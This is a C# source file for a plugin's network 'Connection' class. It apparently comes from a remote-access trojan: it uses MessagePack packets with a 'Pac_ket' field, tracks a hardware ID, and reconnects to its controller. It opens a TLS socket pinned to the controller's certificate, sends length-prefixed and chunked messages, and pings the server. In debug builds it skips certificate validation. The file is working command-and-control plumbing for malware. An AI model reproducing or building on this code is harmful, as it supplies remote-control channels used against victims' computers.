namespace Plugin
{
    using MessagePackLib.MessagePack;
    using System;
    using System.Diagnostics;
    using System.IO;
    using System.Net.Security;
    using System.Net.Sockets;
    using System.Security.Authentication;
    using System.Security.Cryptography.X509Certificates;
    using System.Threading;

    /// <summary>
    /// Defines the <see cref="Connection" />.
    /// </summary>
    public static class Connection
    {
        /// <summary>
        /// Gets or sets the TcpClient.
        /// </summary>
        public static Socket TcpClient { get; set; }

        /// <summary>
        /// Gets or sets the SslClient.
        /// </summary>
        public static SslStream SslClient { get; set; }

        /// <summary>
        /// Gets or sets the ServerCertificate.
        /// </summary>
        public static X509Certificate2 ServerCertificate { get; set; }

        /// <summary>
        /// Gets or sets a value indicating whether IsConnected.
        /// </summary>
        public static bool IsConnected { get; set; }

        /// <summary>
        /// Gets the SendSync.
        /// </summary>
        private static object SendSync { get; } = new object();

        /// <summary>
        /// Gets or sets the Hwid.
        /// </summary>
        public static string Hwid { get; set; }

        /// <summary>
        /// The InitializeClient.
        /// </summary>
        /// <param name="packet">The packet<see cref="byte[]"/>.</param>
        public static void InitializeClient(byte[] packet)
        {
            try
            {

                TcpClient = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                {
                    ReceiveBufferSize = 200 * 1024,
                    SendBufferSize = 200 * 1024,
                };

                TcpClient.Connect(Plugin.Socket.RemoteEndPoint.ToString().Split(':')[0], Convert.ToInt32(Plugin.Socket.RemoteEndPoint.ToString().Split(':')[1]));
                if (TcpClient.Connected)
                {
                    Debug.WriteLine("Plugin Connected!");
                    IsConnected = true;
                    SslClient = new SslStream(new NetworkStream(TcpClient, true), false, ValidateServerCertificate);
                    SslClient.AuthenticateAsClient(TcpClient.RemoteEndPoint.ToString().Split(':')[0], null, SslProtocols.Tls, false);

                    new Thread(() =>
                    {
                        Packet.Read();
                    }).Start();

                }
                else
                {
                    IsConnected = false;
                    return;
                }
            }
            catch
            {
                Debug.WriteLine("Disconnected!");
                IsConnected = false;
                return;
            }
        }

        /// <summary>
        /// The ValidateServerCertificate.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="certificate">The certificate<see cref="X509Certificate"/>.</param>
        /// <param name="chain">The chain<see cref="X509Chain"/>.</param>
        /// <param name="sslPolicyErrors">The sslPolicyErrors<see cref="SslPolicyErrors"/>.</param>
        /// <returns>The <see cref="bool"/>.</returns>
        private static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
#if DEBUG
            return true;
#endif
            return ServerCertificate.Equals(certificate);
        }

        /// <summary>
        /// The Disconnected.
        /// </summary>
        public static void Disconnected()
        {

            try
            {
                IsConnected = false;
                SslClient?.Dispose();
                TcpClient?.Dispose();
                GC.Collect();
            }
            catch { }
        }

        /// <summary>
        /// The Send.
        /// </summary>
        /// <param name="msg">The msg<see cref="byte[]"/>.</param>
        public static void Send(byte[] msg)
        {
            lock (SendSync)
            {
                try
                {
                    if (!IsConnected || msg == null)
                    {
                        return;
                    }

                    byte[] buffersize = BitConverter.GetBytes(msg.Length);
                    TcpClient.Poll(-1, SelectMode.SelectWrite);
                    SslClient.Write(buffersize, 0, buffersize.Length);

                    if (msg.Length > 1000000) //1mb
                    {
                        Debug.WriteLine("send chunks");
                        using (MemoryStream memoryStream = new MemoryStream(msg))
                        {
                            int read = 0;
                            memoryStream.Position = 0;
                            byte[] chunk = new byte[50 * 1000];
                            while ((read = memoryStream.Read(chunk, 0, chunk.Length)) > 0)
                            {
                                TcpClient.Poll(-1, SelectMode.SelectWrite);
                                SslClient.Write(chunk, 0, read);
                                SslClient.Flush();

                            }
                        }
                    }
                    else
                    {
                        TcpClient.Poll(-1, SelectMode.SelectWrite);
                        SslClient.Write(msg, 0, msg.Length);
                        SslClient.Flush();
                    }
                    Debug.WriteLine("Plugin Packet Sent");
                }
                catch
                {
                    IsConnected = false;
                    return;
                }
            }
        }

        /// <summary>
        /// The CheckServer.
        /// </summary>
        /// <param name="obj">The obj<see cref="object"/>.</param>
        public static void CheckServer(object obj)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Ping!)";
            Send(msgpack.Encode2Bytes());
            GC.Collect();
        }
    }
}
